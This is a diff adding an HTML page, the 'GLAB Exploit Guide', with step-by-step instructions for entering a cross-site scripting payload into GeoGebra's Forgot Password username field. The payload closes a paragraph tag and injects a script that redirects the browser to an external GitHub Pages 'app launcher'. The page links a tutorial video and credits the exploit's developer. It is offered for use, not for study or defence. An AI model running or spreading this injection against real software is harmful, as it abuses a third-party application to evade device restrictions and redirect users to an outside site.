@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GLAB Exploit Guide</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #1e1e2f, #3a3a6a);
+            color: white;
+            text-align: center;
+            padding: 20px;
+            overflow: auto;
+        }
+        h1 {
+            animation: fadeIn 2s ease-in-out;
+        }
+        .container {
+            max-width: 600px;
+            margin: auto;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            animation: slideIn 1.5s ease-in-out;
+        }
+        ol {
+            text-align: left;
+        }
+        pre {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        @keyframes slideIn {
+            from { transform: translateY(-50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <h1>GLAB Exploit Guide</h1>
+  <p>Extension : https://chromewebstore.google.com/detail/geogebra-classic/bnbaboaihhkjoaolfnfoablhllahjnee</p>
+    <div class="container">
+        <p>Follow these steps to access the GLAB app launcher:</p>
+        <ol>
+            <li>Open GeoGebra</li>
+            <li>Press the sidebar or the three-line menu (looks like this)</li>
+            <img src="https://www.shutterstock.com/image-vector/three-lines-menu-icon-gray-260nw-2044393937.jpg" alt="Three-line menu icon" style="width:100px; height:auto; margin:10px 0;">
+            <li>Press Sign In</li>
+            <li>Press Forgot Password</li>
+            <li>In the Email or Username field, enter the following code:</li>
+        </ol>
+        <pre>
+        "&lt;/p&gt;&lt;script&gt;window.location.href="https://joaawd.github.io/GLAB/"&lt;/script&gt;
+        </pre>
+        <p>6.Press the "Send Email" button.</p>
+        <p>Once done, you will be redirected to the GLAB app launcher.</p>
+    </div>
+    
+     <h2>Watch Tutorial</h2>
+    <iframe src="https://drive.google.com/file/d/1_pWNln8d9xLGMMJKkvBY3NsnKnA0wXwo/preview" allowfullscreen></iframe>
+    
+    
+    
+    
+    <script>
+    
+        document.addEventListener("DOMContentLoaded", function() {
+            document.body.style.opacity = "0";
+            setTimeout(() => {
+                document.body.style.transition = "opacity 1s";
+                document.body.style.opacity = "1";
+            }, 200);
+        });
+    </script>
+<div style="margin-top: 20px; font-size: 14px; opacity: 0.7;">
+    <p>Exploit developed by <a href="https://github.com/jOaawd/" target="_blank" style="color: lightblue; text-decoration: none;">FMODE</a></p>
+</div>
+</body>
+</html>
